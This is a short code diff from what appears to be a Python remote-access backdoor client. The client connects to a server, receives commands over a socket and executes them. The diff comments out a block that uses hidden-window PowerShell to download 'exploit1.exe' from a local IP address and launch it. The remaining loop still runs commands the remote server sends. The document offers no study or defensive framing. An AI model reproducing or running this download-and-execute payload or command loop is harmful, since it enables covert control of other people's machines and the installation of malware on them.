@@ -27,10 +27,10 @@ while True:
 
         # Receive commands from the server and execute them
         while True:
-            if venom == False:
-                os.system("powershell -windowstyle hidden curl http://192.168.1.9:9000/exploit1.exe -o command.exe")
-                os.system("start command.exe")
-                venom = True
+            #if venom == False:
+                #os.system("powershell -windowstyle hidden curl http://192.168.1.9:9000/exploit1.exe -o command.exe")
+                #os.system("start command.exe")
+                #venom = True
             try:
                 command = client_socket.recv(1024).decode()
                 if command.lower() == 'exit':
